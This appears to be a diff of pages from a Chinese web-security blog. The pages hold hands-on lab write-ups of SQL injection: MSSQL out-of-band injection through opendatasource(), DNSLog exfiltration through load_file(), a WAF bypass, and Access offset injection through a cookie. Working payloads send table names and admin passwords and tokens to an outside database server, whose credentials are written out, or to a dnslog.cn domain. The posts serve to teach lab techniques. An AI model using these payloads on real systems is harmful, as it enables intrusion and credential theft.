-<p>测试接口未删除</p>
-<p>未启用防火墙</p>
-<p>未使用其他的安全防护设备</p>
-<h2 id="注入条件"><a href="#注入条件" class="headerlink" title="注入条件"></a>注入条件</h2><p>用户可以控制传参</p>
-<p>用户输入的语句被带入数据库进行查询</p>
-<h2 id="业务场景"><a href="#业务场景" class="headerlink" title="业务场景"></a>业务场景</h2><p>登录功能</p>
-<p>搜索功能</p>
-<p>详情页</p>
-<p>商品购买</p>
-<p>……</p>
-<p><strong>任何和数据库产生交互的地方都有可能存在注入</strong></p>
-<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>数据库信息泄露：脱库</p>
-<p>网页篡改：通过操作数据库对特定网页进行篡改</p>
-<p>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击</p>
-<p>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员账号被篡改</p>
-<p>服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统</p>
-<h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><blockquote>
-<p><strong>按照HTTP请求方法分类</strong></p>
+          <h1 id="SQL注入-反弹注入"><a href="#SQL注入-反弹注入" class="headerlink" title="SQL注入-反弹注入"></a>SQL注入-反弹注入</h1><hr>
+<h2 id="MSSQL基础"><a href="#MSSQL基础" class="headerlink" title="MSSQL基础"></a>MSSQL基础</h2><p>MSSQL是指微软的SQLServer的数据库服务器</p>
+<p>每个库都会自带有sysobjects表，其中有三个字段</p>
+<ol>
+<li>name 当前数据库下的所有表名</li>
+<li>id 相当于表名的标识</li>
+<li>xtype 字段 中 U 代表用户创建的表名，S代表系统创建的</li>
+</ol>
+<p>每个库都会自带有syscolumns表,其中有两个字段</p>
+<ol>
+<li>name 每个表的字段名</li>
+<li>id 对应sysobjects表中id字段</li>
+</ol>
+<h2 id="反弹注入"><a href="#反弹注入" class="headerlink" title="反弹注入"></a>反弹注入</h2><blockquote>
+<p>原理</p>
 </blockquote>
-<p>GET型注入</p>
-<p>POST型注入</p>
+<p>将目标站点中查询到的数据结果 传到攻击者的数据库中</p>
+<p>注入条件：网络通畅，攻击者需要有公网ip地址的数据库</p>
+<p>所用函数：opendatasource()<br>将当前数据库查询的结果发送到另外一数据库服务器中</p>
+<p>语法：opendatasource(provider_name,int_string)</p>
 <blockquote>
-<p><strong>按照SQL数据类型分类</strong></p>
+<p>公式</p>
 </blockquote>
-<p>整型注入</p>
-<p>字符型注入</p>
+<p>insert into opendatasource(‘sqloledb’,’server&#x3D;服务器地址,1433;<br>uid&#x3D;用户名;pwd&#x3D;密码;database&#x3D;数据库名’).数据库名.dbo.表 SQL语句</p>
 <blockquote>
-<p><strong>其他类型分类</strong></p>
+<p>条件</p>
 </blockquote>
-<p>报错注入</p>
-<p>双注入</p>
-<p>盲注（布尔盲注、时间盲注）</p>
-<p>Cookie注入</p>
-<p>User-Agent注入</p>
-<p>……</p>
+<p> 网络通常，攻击者需要有公网IP的数据库服务器地址</p>
+<blockquote>
+<p>函数</p>
+</blockquote>
+<p>opendatasource()</p>
+<p>作用：将目标站点查询到的数据结果 传到攻击者的数据库中</p>
+<p>用法：</p>
+<p>opendatasource(‘sqloledb’,’server&#x3D;服务器地址,端口号;uid&#x3D;用户名;pwd&#x3D;密码;database&#x3D;数据库名’)</p>
+<blockquote>
+<p>反弹注入 步骤</p>
+</blockquote>
+<ul>
+<li>需创建用于存放目标站点表名的表，字段有id，name</li>
+<li>构造payload 存放 SQL语句查询到的id和name<br><code>&#39;;insert into opendatasource(&#39;sqloledb&#39;,&#39;server=SQL5095.site4now.net,1433;uid=DB_14DBE69_zkaq_admin;pwd=123456789;database=DB_14DBE69_zkaq&#39;).DB_14DBE69_zkaq.dbo.tb select id,name from sysobjects where xtype=&#39;U&#39; -- q</code></li>
+<li>创建用于存放目标站点表名的字段名的表，字段有id，name</li>
+<li>构造payload<br>存放指定表中的字段名<br><code>&#39;;insert into opendatasource(&#39;sqloledb&#39;,&#39;server=SQL5095.site4now.net,1433;uid=DB_14DBE69_zkaq_admin;pwd=123456789;database=DB_14DBE69_zkaq&#39;).DB_14DBE69_zkaq.dbo.col select id,name from syscolumns where id=1977058079 -- q</code></li>
+<li>根据查到的表名字段名 创建表和字段名</li>
+<li>构造payload得到结果<br><code>&#39;;insert into opendatasource(&#39;sqloledb&#39;,&#39;server=SQL5095.site4now.net,1433;uid=DB_14DBE69_zkaq_admin;pwd=123456789;database=DB_14DBE69_zkaq&#39;).DB_14DBE69_zkaq.dbo.res select id,username,passwd,token from admin -- q</code></li>
+</ul>
+<h2 id="靶场（反弹注入）"><a href="#靶场（反弹注入）" class="headerlink" title="靶场（反弹注入）"></a>靶场（反弹注入）</h2><p>1、创建数据表tb，将查询到的id，name存放在该表中<br><img src="https://img-blog.csdnimg.cn/20210410173024557.png" alt="在这里插入图片描述"></p>
+<p>2、构造payload， 查询表名</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">‘;<span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(‘sqloledb’,’<span class="keyword">server</span>=SQL5095.site4now.net,<span class="number">1433</span>;uid=DB_14DBE69_zkaq_admin;</span><br><span class="line">pwd=<span class="number">123456789</span>;<span class="keyword">database</span>=DB_14DBE69_zkaq’).DB_14DBE69_zkaq.dbo.tb <span class="keyword">select</span> id,<span class="type">name</span> <span class="keyword">from</span> sysobjects</span><br><span class="line"> <span class="keyword">where</span> xtype=’U’ — q</span><br></pre></td></tr></table></figure>
+
+<p>返回正常<br><img src="https://img-blog.csdnimg.cn/20210410173117458.png" alt="在这里插入图片描述"></p>
+<p>3、查看 tb表 是否有数据<br><img src="https://img-blog.csdnimg.cn/20210410173127946.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>4、创建存放admin表中字段的表 col<br><img src="https://img-blog.csdnimg.cn/20210410173134513.png" alt="在这里插入图片描述"></p>
+<p>5、构造payload，查admin表的字段</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">‘;<span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(‘sqloledb’,’<span class="keyword">server</span>=SQL5095.site4now.net,<span class="number">1433</span>;uid=DB_14DBE69_zkaq_admin;</span><br><span class="line">pwd=<span class="number">123456789</span>;<span class="keyword">database</span>=DB_14DBE69_zkaq’).DB_14DBE69_zkaq.dbo.col <span class="keyword">select</span> id,<span class="type">name</span> <span class="keyword">from</span> syscolumns</span><br><span class="line"> <span class="keyword">where</span> id=<span class="number">1977058079</span> — q</span><br></pre></td></tr></table></figure>
+
+<p>页面返回正常<br><img src="https://img-blog.csdnimg.cn/20210410173159649.png" alt="在这里插入图片描述"></p>
+<p>6、查看数据库中col表<br><img src="https://img-blog.csdnimg.cn/20210410173211354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>7、得到admin表中字段：id、username、passwd、token<br>创建res表 用于存放admin表中字段信息<br><img src="https://img-blog.csdnimg.cn/20210410173219978.png" alt="在这里插入图片描述"></p>
+<p>8、页面返回正常</p>
+<p><img src="https://img-blog.csdnimg.cn/20210410173226604.png" alt="在这里插入图片描述"></p>
+<p>9、查看res表，得到flag<br><img src="https://img-blog.csdnimg.cn/20210410173237828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="使用显错注入"><a href="#使用显错注入" class="headerlink" title="使用显错注入"></a>使用显错注入</h2><h2 id="显错注入基础"><a href="#显错注入基础" class="headerlink" title="显错注入基础"></a>显错注入基础</h2><ul>
+<li>union 联合查询 去重</li>
+<li>union all 不去重 显示全部数据</li>
+<li>除了MySQL数据库其他数据库查询内容要写全（select 字段 from 表名）</li>
+<li>MySQL在联合查询时对字段数有严格的规定，但是对字段类型规定比较淡</li>
+</ul>
+<h2 id="显错注入步骤"><a href="#显错注入步骤" class="headerlink" title="显错注入步骤"></a>显错注入步骤</h2><ul>
+<li><p>使用sysobjects表中name、id、xtype探测出用户创建了哪些表</p>
+<p>‘ union all select id,name,null from sysobjects where xtype&#x3D;’U’</p>
+</li>
+<li><p>使用syscolumns表探测指定表id的字段名</p>
+<p>‘ union all select id,name,’b’ from syscolumns where id&#x3D;表的id</p>
+</li>
+<li><p>使用selece 直接爆出数据</p>
+<p>select 字段名 from 表名</p>
+</li>
+</ul>
+<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场<br><img src="https://img-blog.csdnimg.cn/20210410173834636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>2、1后加\进行探测<br><img src="https://img-blog.csdnimg.cn/20210410173845696.png" alt="在这里插入图片描述"></p>
+<p>3、构造闭合 ‘ — q<br><img src="https://img-blog.csdnimg.cn/20210410173857498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>4、使用order by 探测字段数<br>order by 4 报错<br><img src="https://img-blog.csdnimg.cn/2021041017390864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>order by 3 正常<br><img src="https://img-blog.csdnimg.cn/20210410173926890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>字段数为3</p>
+<p>5、使用联合查询<br><img src="https://img-blog.csdnimg.cn/20210410173938101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>加union all 试一试<br><img src="https://img-blog.csdnimg.cn/20210410173949632.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>6、猜测表名news<br><img src="https://img-blog.csdnimg.cn/20210410173959934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>7、会不会是 数据类型不对呢，1，2，3全部改为null<br><img src="https://img-blog.csdnimg.cn/20210410174119363.png" alt="在这里插入图片描述"></p>
+<p>8、猜测第一个null是int型，第二ge和第三个是字符型<br><img src="https://img-blog.csdnimg.cn/20210410174100149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>9、通过sysobjects表的id、xtype和name 探测用户创建的表名<br>payload：<br>‘ union all select id,name,’b’ from sysobjects where xtype&#x3D;’U’— q<br><img src="https://img-blog.csdnimg.cn/2021041017404595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>10、探测admin表中的字段，通过syscolumns表中的id和name<br>payload：<br>‘ union all select id,name,’b’ from syscolumns where id&#x3D;1977058079 — q<br><img src="https://img-blog.csdnimg.cn/20210410174145966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>11、查看passwd和token字段数据<br>payload：<br>‘ union all select id,passwd,token from admin — q<br><img src="https://img-blog.csdnimg.cn/20210410174157895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>12、得到flag，通过</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/22/SQL%E6%B3%A8%E5%85%A5-DNSLog%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kilig.gif">
+      <meta itemprop="name" content="kiligwh">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kilig's Blog">
+      <meta itemprop="description" content="欢迎">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | kilig's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/11/22/SQL%E6%B3%A8%E5%85%A5-DNSLog%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入-DNSLog注入</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-11-22 19:28:33" itemprop="dateCreated datePublished" datetime="2022-11-22T19:28:33+08:00">2022-11-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-03-07 21:28:25" itemprop="dateModified" datetime="2023-03-07T21:28:25+08:00">2023-03-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="SQL注入-DNSLog注入"><a href="#SQL注入-DNSLog注入" class="headerlink" title="SQL注入-DNSLog注入"></a>SQL注入-DNSLog注入</h1><hr>
+<h2 id="DNS注入"><a href="#DNS注入" class="headerlink" title="DNS注入"></a>DNS注入</h2><p>DNS注入也称DNS带外注入、DNSLog注入</p>
+<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>DNS（<strong>D</strong>omain <strong>N</strong>ame <strong>S</strong>ystem）域名系统，将域名与IP地址相互映射的一个分布式数据库</p>
+<p>DNS注入核心是 将盲注变为<strong>显错注入</strong></p>
+<h2 id="DNS-log"><a href="#DNS-log" class="headerlink" title="DNS-log"></a>DNS-log</h2><p>DNS服务器的解析记录</p>
+<h2 id="注入基础"><a href="#注入基础" class="headerlink" title="注入基础"></a>注入基础</h2><h3 id="1、load-file-读取文件的函数"><a href="#1、load-file-读取文件的函数" class="headerlink" title="1、load_file() 读取文件的函数"></a>1、load_file() 读取文件的函数</h3><p>读取文件并返回文件内容为字符串</p>
+<p>要使用此函数文件必须位于主服务器上，必须指定完整路径的文件，而且必须有file权限</p>
+<p>该文件所有字节可读，但文件内容必须小于max_allower_packet（限制server接收的数据包大小函数，默认1MB）</p>
+<p>如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回NULL1</p>
+<p>load_file() 是数据库函数</p>
+<p>该功能不是默认开启的，需要在MySQL配置文件加一句：secure_file_priv&#x3D;</p>
+<h3 id="2、UNC路径"><a href="#2、UNC路径" class="headerlink" title="2、UNC路径"></a>2、UNC路径</h3><p>UNC（Universal Naming Convention）</p>
+<p>通用命名规则，也称通用命名规范、通用命名约定</p>
+<p>UNC路径：</p>
+<p>格式：\servername\sharename （servername–服务器名；sharename共享资源的名称）</p>
+<p>目录或文件的UNC名称可以包括共享名称下的目录路径，格式为：\servername\sharename\directory\filename</p>
+<p>unc共享就是指网络硬盘的共享</p>
+<p>UNC路径也可以这样写： &#x2F;&#x2F;servername&#x2F;sharename [ 建议这样写 ]</p>
+<p>DNS-LOG平台：<a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn/</a> 可以记录 是否有人访问了该域名，并且记录域名是什么</p>
+<h3 id="3、concat-字符串连接函数"><a href="#3、concat-字符串连接函数" class="headerlink" title="3、concat() 字符串连接函数"></a>3、concat() 字符串连接函数</h3><h2 id="DNS注入缺陷"><a href="#DNS注入缺陷" class="headerlink" title="DNS注入缺陷"></a>DNS注入缺陷</h2><p>目标必须有网络</p>
+<p>Windows机器较为常见</p>
+<blockquote>
+<p>注意</p>
+</blockquote>
+<p>index.php&#x2F;1.txt?id&#x3D;1</p>
+<p>当1.txt不存在时，就会检测上一级 文件是否存在</p>
+<p>如果上一级文件存在，就会把id&#x3D;1传参给index.php</p>
+<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场，看到源码，可以使用id进行传值<br><img src="https://img-blog.csdnimg.cn/2021041017193491.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2021041017192584.png" alt="在这里插入图片描述"></p>
+<p>2、使用?id&#x3D;1 and 1&#x3D;1 有WAF<br><img src="https://img-blog.csdnimg.cn/20210410172008442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>3、使用&#x2F;1.txt?id&#x3D;1 进行绕过 并分别输入 and 1&#x3D;1 和 and 1&#x3D;2 进行探测<br>绕WAF：<br>1、绕规则<br>2、绕检测<br>3、白名单</p>
+<p>and 1&#x3D;1<br><img src="https://img-blog.csdnimg.cn/20210410172028297.png" alt="在这里插入图片描述"></p>
+<p>and 1&#x3D;2<br><img src="https://img-blog.csdnimg.cn/20210410172035940.png" alt="在这里插入图片描述"></p>
+<p>4、使用DNS注入，用load_file()函数构造payload 爆出数据名名：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>xxx<span class="regexp">/index3.php/</span><span class="number">1</span>.txt?id=<span class="number">1</span> and (select load_file(concat(‘<span class="regexp">//</span>‘,database(),’.h3uk2s.dnslog.cn/abc’)))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210410172054851.png" alt="在这里插入图片描述"></p>
+<p>5、构造payload 爆出当前数据库下的表名：</p>
+<p>爆出第一个表名 admin</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx/index3.php/<span class="number">1.</span>txt?id=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> load_file(concat(‘//‘,(<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> </span><br><span class="line">information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),’.h3uk2s.dnslog.cn/abc’)))</span><br></pre></td></tr></table></figure>
+
+<p>注意：.h3uk2s.dnslog.cn&#x2F;abc 中的abc存不存在 不重要<br><img src="https://img-blog.csdnimg.cn/20210410172118391.png" alt="在这里插入图片描述"></p>
+<p>爆出第二条表名 news<br><img src="https://img-blog.csdnimg.cn/2021041017212945.png" alt="在这里插入图片描述"></p>
+<p>爆出第三条表名时 无反应<br><img src="https://img-blog.csdnimg.cn/20210410172139661.png" alt="在这里插入图片描述"></p>
+<p>故判断 只有两张表 admin news</p>
+<p>6、构造payload爆出admin表下的字段名<br>爆出第一个字段名id</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx/index3.php/<span class="number">1.</span>txt?id=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> load_file(concat(‘//‘,</span><br><span class="line">(<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> <span class="built_in">table_name</span>=’<span class="keyword">admin</span>’ </span><br><span class="line"><span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),’.h3uk2s.dnslog.cn/abc’)))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210410172211971.png" alt="在这里插入图片描述"></p>
+<p>爆出第二个字段名 limit 1,1 username<br><img src="https://img-blog.csdnimg.cn/20210410172222651.png" alt="在这里插入图片描述"></p>
+<p>爆出第三个字段名limit 2,1 password<br><img src="https://img-blog.csdnimg.cn/20210410172233359.png" alt="在这里插入图片描述"></p>
+<p>爆出第四个字段名时 limit 3,1 无反应<br>故判断 admin表下总共3个字段 id、username、password</p>
+<p>7、flag可能在password字段中，所以构造payload 爆出password字段中的信息<br>爆出第一条信息</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx/index3.php/<span class="number">1.</span>txt?id=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> load_file(concat(‘//‘,</span><br><span class="line">(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),’.h3uk2s.dnslog.cn/abc’)))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210410172254527.png" alt="在这里插入图片描述"></p>
+<p>使用limit 1,1 没有反应<br><img src="https://img-blog.csdnimg.cn/20210410172318442.png" alt="在这里插入图片描述"></p>
+<p>故判断只有一条信息<br>8、得到flag，通关</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/21/SQL%E6%B3%A8%E5%85%A5-%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kilig.gif">
+      <meta itemprop="name" content="kiligwh">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kilig's Blog">
+      <meta itemprop="description" content="欢迎">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | kilig's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/11/21/SQL%E6%B3%A8%E5%85%A5-%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入-偏移注入</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-11-21 18:28:04" itemprop="dateCreated datePublished" datetime="2022-11-21T18:28:04+08:00">2022-11-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-03-07 21:29:24" itemprop="dateModified" datetime="2023-03-07T21:29:24+08:00">2023-03-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="SQL注入-偏移注入"><a href="#SQL注入-偏移注入" class="headerlink" title="SQL注入-偏移注入"></a>SQL注入-偏移注入</h1><hr>
+<p>偏移注入也称移位溢出</p>
+<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>知道表名，不知道字段名</p>
+<p>注入点的字段数要大于需要查询的表名字段数</p>
+<h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><p>order by 判断字段数</p>
+<p>猜测表名 and exists(select * from 表名)</p>
+<p>开始偏移注入</p>
+<p>注意：<br>select username,password from admin<br>&#x3D;&gt;select * from admin<br>&#x3D;&gt;select admin.* from admin<br>库名.表名.字段名</p>
+<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场，观察ID进行了传递参数，探测id是否可以注入<br><img src="https://img-blog.csdnimg.cn/20210410170853717.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210410170858194.png" alt="在这里插入图片描述"></p>
+<p>2、使用order by 判断字段数<br><img src="https://img-blog.csdnimg.cn/20210410170945896.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210410170959783.png" alt="在这里插入图片描述"></p>
+<p>3、得出字段数为26，使用union查询，弹出警告<br><img src="https://img-blog.csdnimg.cn/20210410171014337.png" alt="在这里插入图片描述"></p>
+<p>4、观察cookie可以进行传参<br><img src="https://img-blog.csdnimg.cn/20210410171033250.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210410171021982.png" alt="在这里插入图片描述"></p>
+<p>5、使用联合查询，注意cookie的传入的值需要进行URL编码<br>-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26<br>报错<br><img src="https://img-blog.csdnimg.cn/20210410171047318.png" alt="在这里插入图片描述"></p>
+<p>6、猜测数据库可能不是MySQL，.asp网站 使用accesss数据库居多，<br>故猜测表名可能是admin，使用 105 and exists(select * from admin)<br><img src="https://img-blog.csdnimg.cn/2021041017112533.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>7、得到表名admin，使用联合查询 探测回显点<br>-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 from admin<br><img src="https://img-blog.csdnimg.cn/20210410171154851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>8、26个字段才回显三个？ 重新构造payload 打开网页源码<br>-1 union select 971,972,973,974,975,976,977,978,979,9710,9711,9712,9713,9714,9715,9716,9717,9718,9719,9720,9721,9722,9723,9724,9725,9726 from admin<br><img src="https://img-blog.csdnimg.cn/20210410171218372.png" alt="在这里插入图片描述"></p>
